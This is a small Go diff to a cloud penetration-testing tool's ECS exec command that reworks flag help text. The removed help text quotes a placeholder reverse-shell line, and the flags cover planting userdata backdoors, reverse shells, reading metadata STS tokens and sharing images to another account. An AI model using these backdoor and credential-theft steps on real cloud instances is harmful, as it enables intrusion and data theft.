@@ -27,7 +27,7 @@ var (
 	ecsLsSpecifiedInstanceID   string
 	ecsExecSpecifiedInstanceID string
 	userDataBackdoor           string
-	imageShare				   string
+	imageShare                 string
 )
 
 func init() {
@@ -50,8 +50,8 @@ func init() {
 	ecsExecCmd.Flags().StringVar(&lport, "lport", "", "设置反弹 shell 的主机端口 (Set the port of the listening host)")
 	ecsExecCmd.Flags().BoolVarP(&batchCommand, "batchCommand", "b", false, "一键执行三要素，方便 HW (Batch execution of multiple commands used to prove permission acquisition)")
 	ecsExecCmd.Flags().BoolVarP(&userData, "userData", "u", false, "一键获取实例中的用户数据 (Get the user data on the instance)")
-	ecsExecCmd.Flags().StringVarP(&userDataBackdoor, "userDataBackdoor", "U", "", "参数中输入命令例如\"bash -i >& /dev/tcp/RHOST/RPORT 0>&1\"，放置userdata后门 (Input the command such as \"bash -i >& /dev/tcp/RHOST/RPORT 0>&1\", Place backdoor userdata on instance)")
-	ecsExecCmd.Flags().StringVarP(&imageShare, "imageShare", "I", "", "参数中输入额外的阿里云帐号ID，例如186xxxxxxxxx5480，劫持实例存储数据到目标阿里云帐号中 (Enter an additional Aliyun account ID, such as 186xxxxxxxxx5480, to hijack the ECS to store data in the target Aliyun account)")
+	ecsExecCmd.Flags().StringVar(&userDataBackdoor, "userDataBackdoor", "", "输入后门命令，该命令会在实例重启后被执行 (Enter a backdoor command that will be executed after the instance restarts)")
+	ecsExecCmd.Flags().StringVar(&imageShare, "imageShare", "", "输入云租户的帐号 ID 进行镜像共享 (Enter the account ID for image sharing.)")
 	ecsExecCmd.Flags().BoolVarP(&metaDataSTSToken, "metaDataSTSToken", "m", false, "一键获取实例元数据中的临时访问密钥 (Get the STS Token in the instance metadata)")
 	ecsExecCmd.Flags().IntVarP(&timeOut, "timeOut", "t", 60, "设置命令执行结果的等待时间 (Set the command execution result waiting time)")
 	ecsExecCmd.Flags().BoolVarP(&ecsExecAllRegions, "allRegions", "a", false, "使用所有区域，包括私有区域 (Use all regions, including private regions)")
@@ -85,7 +85,7 @@ var ecsExecCmd = &cobra.Command{
 		} else if lhost == "" && lport != "" {
 			log.Warnln("未指定反弹 shell 的主机 IP (The ip of the listening host is not set)")
 			cmd.Help()
-		} else if command == "" && batchCommand == false && userData == false && metaDataSTSToken == false && commandFile == "" && lhost == "" && lport == "" && userDataBackdoor == "" && imageShare == ""{
+		} else if command == "" && batchCommand == false && userData == false && metaDataSTSToken == false && commandFile == "" && lhost == "" && lport == "" && userDataBackdoor == "" && imageShare == "" {
 			log.Warnf("还未指定要执行的命令 (The command to be executed has not been specified yet)\n")
 			cmd.Help()
 		} else {
